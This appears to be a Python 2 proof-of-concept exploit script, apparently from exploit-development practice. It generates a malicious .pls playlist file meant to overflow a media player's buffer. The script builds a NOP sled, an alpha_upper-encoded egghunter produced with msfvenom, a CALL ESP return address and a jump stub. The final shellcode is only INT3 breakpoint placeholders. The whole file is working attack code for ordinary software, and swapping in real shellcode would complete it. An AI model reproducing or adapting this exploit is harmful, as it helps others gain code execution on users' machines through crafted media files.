import sys

if len(sys.argv) <= 1:
    print "Usage: python " + sys.argv[0] + " [filename]"
    exit()

filename = sys.argv[1]

# Prefix
prefix = "[playlist]\r\nFile1=\\\\"

# Generate NOP's
nop = "\x90" * 856

# Egg string, reversed "ODOR"
# egg = "ODOR"[::-1]

# Egghunter using egg
# egghunt = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
# egghunt += egg
# egghunt += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

# msfvenom -p generic/custom PAYLOADFILE=egghunter_debug.bin -e x86/alpha_upper -f python -v egghunt
# Size 132 bytes
egghunt =  ""
egghunt += "\x89\xe2\xdb\xc3\xd9\x72\xf4\x5a\x4a\x4a\x4a\x4a"
egghunt += "\x4a\x43\x43\x43\x43\x43\x43\x52\x59\x56\x54\x58"
egghunt += "\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48"
egghunt += "\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41"
egghunt += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50"
egghunt += "\x38\x41\x43\x4a\x4a\x49\x45\x36\x4b\x31\x48\x4a"
egghunt += "\x4b\x4f\x44\x4f\x57\x32\x31\x42\x32\x4a\x45\x52"
egghunt += "\x36\x38\x48\x4d\x56\x4e\x57\x4c\x45\x55\x30\x5a"
egghunt += "\x34\x34\x4a\x4f\x4f\x48\x46\x32\x50\x4f\x57\x34"
egghunt += "\x50\x4f\x4c\x4b\x4a\x5a\x4e\x4f\x33\x45\x4a\x4a"
egghunt += "\x4e\x4f\x34\x35\x4a\x47\x4b\x4f\x4b\x57\x41\x41"

# Shellcode
sc = "\xcc" * (166 - len(egghunt))

# Jump around
jump = "\xe3\x27\x29\x1a"                       # 1A2927E3   FFD4  CALL ESP
jump += "\x83\xec\x58\x83\xec\x58\xff\xe4"      # First stage payload
jump += "\x90" * 4                              # NOP padding

# Suffix
suffix = "\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n"

# Concatenate string for sending
code = prefix + nop + egghunt + sc + jump + suffix

f = open(filename, 'wb')
f.write(code)
f.close()
